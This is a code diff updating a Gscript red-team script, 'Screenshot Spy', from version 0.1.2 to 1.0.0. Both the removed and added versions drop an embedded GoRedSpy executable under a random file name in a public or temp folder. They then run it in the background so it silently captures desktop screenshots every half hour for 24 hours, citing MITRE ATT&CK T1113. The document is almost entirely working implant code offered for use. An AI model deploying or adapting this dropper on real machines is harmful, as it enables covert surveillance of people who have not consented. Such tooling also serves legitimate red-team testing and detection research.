@@ -2,36 +2,35 @@
 // Title: Screenshot Spy
 // Author: ahhh
 // Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
-// Gscript version: 0.1.2
+// Gscript version: 1.0.0
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1113
 // Using GoRedSpy to take screenshots: https://github.com/ahhh/GoRedSpy
 
 //priority:150
 //timeout:150
 //import:/private/tmp/GoRedSpy.exe
+//go_import:os as os
+  
+  function Deploy() {  
+    console.log("Starting GoRedSpy");
 
+    // Prep the sample
+    var spy = GetAssetAsBytes("GoRedSpy.exe");
+    var temppath = os.TempDir();
+    var naming = G.rand.GetAlphaString(5);
+    naming = naming.toLowerCase();
+    var fullpath = temppath+"\\"+naming+".exe";
 
-function BeforeDeploy() {
-  LogInfo("Starting GoRedSpy");
-  return true; 
-}
+    // Drop the sample
+    console.log("file name: "+ fullpath);
+    errors = G.file.WriteFileFromBytes(fullpath, spy[0]);
+    console.log("errors: "+errors);
+      
+    // Run the sample
+    var running = G.exec.ExecuteCommandAsync(fullpath, ["-outDir", temppath, "-count", "48", "-delay", "1800s"]);
+    console.log("errors running: "+running[1]);
 
-function Deploy() {  
-  // Drop the sample
-  var spy = Asset("GoRedSpy.exe");
-  var name = "";
-  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  for (var i = 0; i < 5; i++)
-    name += possible.charAt(Math.floor(Math.random() * possible.length));
-  name = "C:\\Users\\Public\\" + name + ".exe";
-  WriteFile(name, spy.fileData, 0755);
-  LogInfo("dropped the spy binary here: " + name);
-    
-  ForkExecuteCommand(name, ["-outDir", "C:\\Users\\Public\\", "-count", "48", "-delay", "1800s"]);
-  return true;
-}
-
-function AfterDeploy() {
-  LogInfo("Done GoRedSpy");
-  return true;
-}
+    console.log("Done GoRedSpy");
+    return true;
+  }
+  
